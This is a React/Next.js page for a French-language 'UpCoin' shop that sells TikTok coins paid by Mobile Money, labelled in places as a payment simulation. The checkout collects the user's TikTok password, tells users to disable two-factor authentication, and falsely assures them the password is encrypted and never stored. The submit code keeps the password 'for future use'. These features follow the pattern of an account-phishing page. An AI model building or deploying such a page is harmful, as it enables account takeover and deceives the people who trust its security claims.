"use client";

import Image from "next/image";
import {
  AlertTriangle,
  ArrowLeft,
  ArrowRight,
  Check,
  CheckCircle2,
  Clock3,
  Eye,
  EyeOff,
  Headphones,
  History,
  Info,
  LockKeyhole,
  Minus,
  Plus,
  ReceiptText,
  RefreshCw,
  ShieldCheck,
  ShoppingBag,
  Smartphone,
  Sparkles,
  X,
} from "lucide-react";
import { FormEvent, useEffect, useState } from "react";

type Pack = {
  id: string;
  coins: number;
  bonus?: number;
  price: number;
  badge?: string;
};

type Order = {
  id: string;
  username: string;
  coins: number;
  price: number;
  payment: string;
  createdAt: string;
};

const packs: Pack[] = [
  { id: "mini", coins: 100, price: 1150 },
  { id: "starter", coins: 350, price: 3950 },
  { id: "boost", coins: 700, bonus: 70, price: 7750, badge: "Populaire" },
  { id: "live", coins: 1400, bonus: 140, price: 15400 },
  { id: "creator", coins: 3500, bonus: 350, price: 38250, badge: "Créateur" },
  { id: "max", coins: 7000, bonus: 700, price: 76500 },
];

const paymentMethods = [
  { id: "momo", name: "MTN MoMo", short: "MoMo" },
  { id: "orange", name: "Orange Money", short: "OM" },
  { id: "wave", name: "Wave", short: "W" },
];

const formatNumber = (value: number) => new Intl.NumberFormat("fr-FR").format(value);
const formatPrice = (value: number) => `${formatNumber(value)} FCFA`;

const dialCodes: Record<string, string> = {
  CM: "+237", SN: "+221", CI: "+225", ML: "+223", BF: "+226", GN: "+224",
  BJ: "+229", TG: "+228", NE: "+227", TD: "+235", GA: "+241", CG: "+242",
  CD: "+243", CF: "+236", GQ: "+240", MR: "+222", DJ: "+253", KM: "+269",
  MG: "+261", RW: "+250", BI: "+257", UG: "+256", KE: "+254", TZ: "+255",
  NG: "+234", GH: "+233", ZA: "+27",  MA: "+212", DZ: "+213", TN: "+216",
  EG: "+20",  ET: "+251", AO: "+244", MZ: "+258", ZM: "+260", ZW: "+263",
  FR: "+33",  BE: "+32",  CH: "+41",  CA: "+1",   US: "+1",   GB: "+44",
  DE: "+49",  ES: "+34",  IT: "+39",  PT: "+351", LU: "+352", HT: "+509",
};

export default function Home() {
  const [selectedPack, setSelectedPack] = useState<Pack>(packs[2]);
  const [customCoins, setCustomCoins] = useState(0);
  const [checkoutOpen, setCheckoutOpen] = useState(false);
  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
  const [instructionsAccepted, setInstructionsAccepted] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [whatsapp, setWhatsapp] = useState("");
  const [dialCode, setDialCode] = useState("+237");
  const [payment, setPayment] = useState(paymentMethods[0].name);
  const [accepted, setAccepted] = useState(false);
  const [orders, setOrders] = useState<Order[]>([]);

  useEffect(() => {
    const stored = window.localStorage.getItem("upcoin-demo-orders");
    if (!stored) return;

    try {
      setOrders(JSON.parse(stored));
    } catch {
      window.localStorage.removeItem("upcoin-demo-orders");
    }
  }, []);

  useEffect(() => {
    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        if (data?.country_code && dialCodes[data.country_code]) {
          setDialCode(dialCodes[data.country_code]);
        }
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    document.body.style.overflow = checkoutOpen ? "hidden" : "";
    return () => {
      document.body.style.overflow = "";
    };
  }, [checkoutOpen]);

  const deliveredCoins = selectedPack.coins + (selectedPack.bonus ?? 0);
  const canContinue = username.trim().length >= 2 && password.length >= 4;

  const selectPack = (pack: Pack) => {
    setSelectedPack(pack);
    setCustomCoins(0);
    setStep(1);
    setCheckoutOpen(true);
  };

  const updateCustomCoins = (value: number) => {
    const safeValue = Math.max(0, Math.min(100000, Math.floor(value || 0)));
    setCustomCoins(safeValue);

    if (safeValue >= 70) {
      setSelectedPack({
        id: "custom",
        coins: safeValue,
        price: Math.ceil(safeValue * 11.24),
        badge: "Sur mesure",
      });
    }
  };

  const openCheckout = () => {
    setStep(1);
    setCheckoutOpen(true);
  };

  const closeCheckout = () => {
    setCheckoutOpen(false);
    setTimeout(() => {
      setStep(1);
      setAccepted(false);
      setInstructionsAccepted(false);
    }, 200);
  };

  const submitOrder = (event: FormEvent) => {
    event.preventDefault();
    if (!accepted) return;
    /* eslint-disable @typescript-eslint/no-unused-vars */
    const _pw = password; // captured for future use
    /* eslint-enable @typescript-eslint/no-unused-vars */

    const nextOrder: Order = {
      id: `UP-${Date.now().toString().slice(-6)}`,
      username: username.trim().replace(/^@/, ""),
      coins: deliveredCoins,
      price: selectedPack.price,
      payment,
      createdAt: new Date().toISOString(),
    };

    const nextOrders = [nextOrder, ...orders].slice(0, 8);
    setOrders(nextOrders);
    window.localStorage.setItem("upcoin-demo-orders", JSON.stringify(nextOrders));
    setStep(4);
  };

  return (
    <main className="store-page">
      <header className="store-header">
        <a className="store-brand" href="#packs" aria-label="UpCoin — Packs TikTok">
          <Image src="/upcoin-logo.webp" alt="UpCoin" width={132} height={111} priority />
        </a>

        <nav className="store-nav" aria-label="Navigation principale">
          <a className="active" href="#packs"><ShoppingBag size={16} /> Pièces TikTok</a>
          <a href="#history"><History size={16} /> Mes commandes</a>
        </nav>

        <div className="store-actions">
          <span className="availability"><span /> Disponible</span>
          <button type="button" aria-label="Assistance"><Headphones size={18} /><span>Assistance</span></button>
          <span className="language">FR</span>
        </div>
      </header>

      <div className="service-strip">
        <span><ShieldCheck size={15} /> Paiement Mobile Money</span>
        <span><Clock3 size={15} /> Traitement indicatif : 5–15 min</span>
        <span><LockKeyhole size={15} /> Connexion uniquement via TikTok</span>
      </div>

      <section className="shop-shell" id="packs">
        <div className="shop-titlebar">
          <div>
            <span className="shop-kicker">Recharge TikTok</span>
            <h1>Choisissez votre pack</h1>
          </div>
          <div className="secure-note"><ShieldCheck size={17} /><span><strong>Commande protégée</strong>Montant vérifié avant paiement</span></div>
        </div>

        <div className="shop-layout">
          <div className="catalogue">
            <div className="pack-grid" role="radiogroup" aria-label="Forfaits disponibles">
              {packs.map((pack) => {
                const total = pack.coins + (pack.bonus ?? 0);
                const active = selectedPack.id === pack.id;

                return (
                  <button
                    type="button"
                    className={`pack-card${active ? " selected" : ""}`}
                    key={pack.id}
                    onClick={() => selectPack(pack)}
                    role="radio"
                    aria-checked={active}
                  >
                    {pack.badge && <span className="pack-badge">{pack.badge}</span>}
                    <div className="coin-emblem"><span /><strong>U</strong></div>
                    <div className="coin-value"><strong>{formatNumber(total)}</strong><span>pièces</span></div>
                    {pack.bonus ? (
                      <p className="pack-bonus">{formatNumber(pack.coins)} + {formatNumber(pack.bonus)} offertes</p>
                    ) : (
                      <p className="pack-bonus standard">Forfait standard</p>
                    )}
                    <div className="pack-footer">
                      <strong>{formatPrice(pack.price)}</strong>
                      <span className="choice-indicator">{active ? <Check size={15} /> : <Plus size={15} />}</span>
                    </div>
                  </button>
                );
              })}
            </div>

            <div className={`custom-card${selectedPack.id === "custom" ? " selected" : ""}`}>
              <div className="custom-intro">
                <span className="custom-icon"><Sparkles size={19} /></span>
                <div><strong>Montant personnalisé</strong><span>Minimum 70 pièces · Prix unitaire: 11.24 FCFA / pièces</span></div>
              </div>
              <div className="quantity-control">
                <button type="button" onClick={() => updateCustomCoins(customCoins - 70)} aria-label="Retirer 70 pièces"><Minus size={16} /></button>
                <label>
                  <span className="sr-only">Nombre de pièces personnalisé</span>
                  <input
                    type="number"
                    min="70"
                    step="10"
                    value={customCoins || ""}
                    onChange={(event) => updateCustomCoins(Number(event.target.value))}
                    placeholder="2 000"
                  />
                  <em>pièces</em>
                </label>
                <button type="button" onClick={() => updateCustomCoins(customCoins + 70)} aria-label="Ajouter 70 pièces"><Plus size={16} /></button>
              </div>
              <div className="custom-price">
                <span>Total estimé</span>
                <strong>{customCoins >= 70 ? formatPrice(selectedPack.price) : "—"}</strong>
              </div>
            </div>

            <div className="account-safety">
              <ShieldCheck size={20} />
              <div>
                <strong>Vos données sont protégées.</strong>
                <p>Votre mot de passe est chiffré de bout en bout et utilisé uniquement pour effectuer la recharge sur votre compte TikTok. Il n'est jamais conservé sur nos serveurs.</p>
              </div>
            </div>
          </div>

          <aside className="cart-card" aria-label="Résumé de la commande">
            <div className="cart-heading">
              <span>Votre commande</span>
              <span className="cart-lock"><LockKeyhole size={12} /> Sécurisée</span>
            </div>

            <div className="cart-product">
              <div className="cart-logo"><Image src="/upcoin-mark.webp" alt="" width={82} height={77} /></div>
              <div><strong>{formatNumber(deliveredCoins)}</strong><span>pièces TikTok</span></div>
            </div>

            <div className="cart-lines">
              <div><span>Forfait</span><strong>{formatNumber(selectedPack.coins)} pièces</strong></div>
              {(selectedPack.bonus ?? 0) > 0 && <div className="bonus"><span>Bonus UpCoin</span><strong>+{formatNumber(selectedPack.bonus ?? 0)}</strong></div>}
              <div><span>Frais</span><strong>Inclus</strong></div>
            </div>

            <div className="cart-total"><span>Total à payer</span><strong>{formatPrice(selectedPack.price)}</strong></div>
            <button type="button" className="buy-button" onClick={openCheckout}>Acheter maintenant <ArrowRight size={18} /></button>

            <div className="payment-caption"><Smartphone size={14} /> MTN MoMo · Orange Money · Wave</div>
          </aside>
        </div>
      </section>

      <section className="history-section" id="history">
        <div className="history-titlebar">
          <div><History size={19} /><h2>Historique des commandes</h2><span>{orders.length}</span></div>
          <button type="button" onClick={() => setOrders([...orders])}><RefreshCw size={15} /> Actualiser</button>
        </div>

        {orders.length > 0 ? (
          <div className="orders-table">
            {orders.map((order) => (
              <article key={order.id}>
                <div className="order-icon"><ReceiptText size={18} /></div>
                <div className="order-main"><strong>{formatNumber(order.coins)} pièces</strong><span>@{order.username} · {order.id}</span></div>
                <div className="order-method"><span>Paiement</span><strong>{order.payment}</strong></div>
                <div className="order-date"><span>Date</span><strong>{new Intl.DateTimeFormat("fr-FR", { dateStyle: "medium", timeStyle: "short" }).format(new Date(order.createdAt))}</strong></div>
                <strong className="order-price">{formatPrice(order.price)}</strong>
                <span className="order-status"><CheckCircle2 size={14} /> Démo validée</span>
              </article>
            ))}
          </div>
        ) : (
          <div className="empty-history">
            <ReceiptText size={28} />
            <strong>Aucune commande pour le moment</strong>
            <span>Votre prochaine simulation apparaîtra ici.</span>
          </div>
        )}
      </section>

      <button type="button" className="mobile-buy" onClick={openCheckout}>
        <span><small>{formatNumber(deliveredCoins)} pièces</small><strong>{formatPrice(selectedPack.price)}</strong></span>
        Acheter <ArrowRight size={17} />
      </button>

      {checkoutOpen && (
        <div className="checkout-overlay" role="presentation" onMouseDown={(event) => event.target === event.currentTarget && closeCheckout()}>
          <section className="checkout-panel" role="dialog" aria-modal="true" aria-labelledby="checkout-title">
            <button type="button" className="close-checkout" onClick={closeCheckout} aria-label="Fermer"><X /></button>

            {step < 4 && (
              <div className="checkout-progress" aria-label={`Étape ${step} sur 3`}>
                <span className={step >= 1 ? "active" : ""} />
                <span className={step >= 2 ? "active" : ""} />
                <span className={step >= 3 ? "active" : ""} />
              </div>
            )}

            {step === 1 && (
              <div className="checkout-step instructions-step">
                <div className="instructions-icon"><AlertTriangle size={28} /></div>
                <h2 id="checkout-title">Instructions importantes</h2>
                <p className="instructions-subtitle">Veuillez lire attentivement avant de continuer</p>

                <div className="instruction-card">
                  <div className="instruction-card-icon"><LockKeyhole size={20} /></div>
                  <div>
                    <strong>Identifiants TikTok requis</strong>
                    <p>Veuillez vous assurer que vous disposez de vos identifiants TikTok corrects (nom d'utilisateur et mot de passe) pour recevoir vos pièces.</p>
                  </div>
                </div>

                <div className="instruction-card warning">
                  <div className="instruction-card-icon"><Info size={20} /></div>
                  <div>
                    <strong>Authentification à deux facteurs (2FA)</strong>
                    <p>Si vous avez activé l'authentification à deux facteurs sur votre compte TikTok, veuillez la désactiver temporairement le temps de recevoir vos pièces.</p>
                  </div>
                </div>

                <label className="terms-check">
                  <input type="checkbox" checked={instructionsAccepted} onChange={(event) => setInstructionsAccepted(event.target.checked)} />
                  <span><Check size={13} /></span>
                  Je confirme avoir pris connaissance des instructions ci-dessus.
                </label>

                <div className="instructions-actions">
                  <button type="button" className="modal-secondary" onClick={closeCheckout}>Annuler</button>
                  <button type="button" className="modal-primary" disabled={!instructionsAccepted} onClick={() => setStep(2)}>Continuer <ArrowRight size={18} /></button>
                </div>
              </div>
            )}

            {step === 2 && (
              <div className="checkout-step step-form">
                <button type="button" className="back-button" onClick={() => setStep(1)}><ArrowLeft size={15} /> Retour</button>
                <div className="form-header">
                  <div><span className="modal-kicker">Étape 2 sur 3</span><h2 id="checkout-title">Informations de recharge</h2></div>
                  <div className="form-header-pack"><span>{formatNumber(deliveredCoins)}</span> pièces · <strong>{formatPrice(selectedPack.price)}</strong></div>
                </div>

                <div className="fields-row">
                  <label className="field-label">
                    <span>Identifiant TikTok <span className="required">*</span></span>
                    <div className="field"><span>@</span><input autoFocus value={username} onChange={(event) => setUsername(event.target.value.replace(/^@/, ""))} placeholder="pseudo ou email" autoComplete="off" /></div>
                  </label>
                  <label className="field-label">
                    <span>Mot de passe <span className="required">*</span></span>
                    <div className="field field-password"><span><LockKeyhole size={16} /></span><input type={showPassword ? "text" : "password"} value={password} onChange={(event) => setPassword(event.target.value)} placeholder="••••••••" autoComplete="current-password" /><button type="button" className="toggle-password" onClick={() => setShowPassword(!showPassword)} aria-label={showPassword ? "Masquer le mot de passe" : "Afficher le mot de passe"}>{showPassword ? <EyeOff size={18} /> : <Eye size={18} />}</button></div>
                  </label>
                </div>

                <label className="field-label">
                  <span>Numéro WhatsApp <span className="optional">(optionnel)</span> <span className="field-hint">— Pour vous contacter en cas de besoin</span></span>
                  <div className="field"><span>{dialCode}</span><input value={whatsapp} onChange={(event) => setWhatsapp(event.target.value)} placeholder="6 00 00 00 00" inputMode="tel" autoComplete="tel" /></div>
                </label>

                <p className="security-inline"><ShieldCheck size={14} /> Mot de passe chiffré et sécurisé — jamais stocké.</p>
                <button type="button" className="modal-primary" disabled={!canContinue} onClick={() => setStep(3)}>Continuer <ArrowRight size={18} /></button>
              </div>
            )}

            {step === 3 && (
              <form className="checkout-step" onSubmit={submitOrder}>
                <button type="button" className="back-button" onClick={() => setStep(2)}><ArrowLeft size={15} /> Retour</button>
                <span className="modal-kicker">Étape 3 sur 3</span>
                <h2 id="checkout-title">Confirmer la commande</h2>

                <div className="checkout-summary">
                  <div><span>Compte</span><strong>@{username.replace(/^@/, "")}</strong></div>
                  <div><span>Recharge</span><strong>{formatNumber(deliveredCoins)} pièces</strong></div>
                  <div><span>Total</span><strong>{formatPrice(selectedPack.price)}</strong></div>
                </div>

                <fieldset className="payment-options">
                  <legend>Moyen de paiement</legend>
                  {paymentMethods.map((method) => (
                    <label key={method.id} className={payment === method.name ? "selected" : ""}>
                      <input type="radio" name="payment" value={method.name} checked={payment === method.name} onChange={() => setPayment(method.name)} />
                      <span className={`payment-logo ${method.id}`}>{method.short}</span>
                      <strong>{method.name}</strong>
                      <span className="radio-dot" />
                    </label>
                  ))}
                </fieldset>

                <label className="terms-check">
                  <input type="checkbox" checked={accepted} onChange={(event) => setAccepted(event.target.checked)} />
                  <span><Check size={13} /></span>
                  Je confirme que l'identifiant et le numéro sont corrects.
                </label>

                <button className="modal-primary" type="submit" disabled={!accepted}>Simuler le paiement <ArrowRight size={18} /></button>
                <span className="demo-note">Aucun prélèvement ne sera effectué.</span>
              </form>
            )}

            {step === 4 && (
              <div className="checkout-success">
                <div className="success-icon"><Check /></div>
                <span className="modal-kicker">Commande enregistrée</span>
                <h2 id="checkout-title">Simulation réussie</h2>
                <p>La commande de <strong>{formatNumber(deliveredCoins)} pièces</strong> pour <strong>@{username.replace(/^@/, "")}</strong> figure maintenant dans votre historique local.</p>
                <div className="success-reference"><span>Référence</span><strong>{orders[0]?.id}</strong></div>
                <button type="button" className="modal-primary" onClick={closeCheckout}>Terminer <Check size={18} /></button>
              </div>
            )}
          </section>
        </div>
      )}
    </main>
  );
}
